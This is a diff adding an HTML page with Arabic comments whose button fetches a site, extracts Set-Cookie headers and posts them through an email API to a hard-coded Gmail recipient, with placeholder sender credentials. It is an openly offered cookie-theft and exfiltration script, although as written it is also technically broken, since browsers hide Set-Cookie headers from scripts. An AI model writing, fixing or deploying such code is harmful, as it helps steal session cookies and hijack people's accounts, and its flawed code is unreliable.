@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Send Cookies via Email</title>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+</head>
+<body>
+    
+    <button onclick="sendCookiesViaEmail()">Send Cookies</button>
+
+    <script>
+        function sendCookiesViaEmail() {
+            // إرسال طلب GET للحصول على الصفحة واستخراج الكوكيز
+            $.get("https://example.com", function(data, status, xhr) {
+                var cookies = xhr.getAllResponseHeaders().match(/set-cookie:(.*?);/gi);
+                var cookiesString = cookies.join("\n");
+
+                // إرسال الملف عبر البريد الإلكتروني
+                sendFileViaEmail(cookiesString, "wacwacsoufiane65@gmail.com");
+            });
+        }
+
+        function sendFileViaEmail(fileContent, recipientEmail) {
+            // معلومات البريد الإلكتروني
+            var senderEmail = "your_email@gmail.com"; // البريد الإلكتروني الذي سيتم إرسال الرسالة منه
+            var senderPassword = "your_password"; // كلمة المرور الخاصة بالبريد الإلكتروني
+            var subject = "Cookies"; // عنوان البريد الإلكتروني
+            var body = fileContent; // محتوى الملف
+
+            // إرسال البريد الإلكتروني باستخدام خدمة البريد الإلكتروني الخاصة بك
+            $.post("https://api.your-email-service.com/send", {
+                senderEmail: senderEmail,
+                senderPassword: senderPassword,
+                recipientEmail: recipientEmail,
+                subject: subject,
+                body: body
+            }, function(data, status) {
+                if (status === "success") {
+                    alert("تم إرسال الملف عبر البريد الإلكتروني بنجاح!");
+                } else {
+                    alert("حدث خطأ أثناء إرسال الملف عبر البريد الإلكتروني.");
+                }
+            });
+        }
+    </script>
+</body>
+</html>
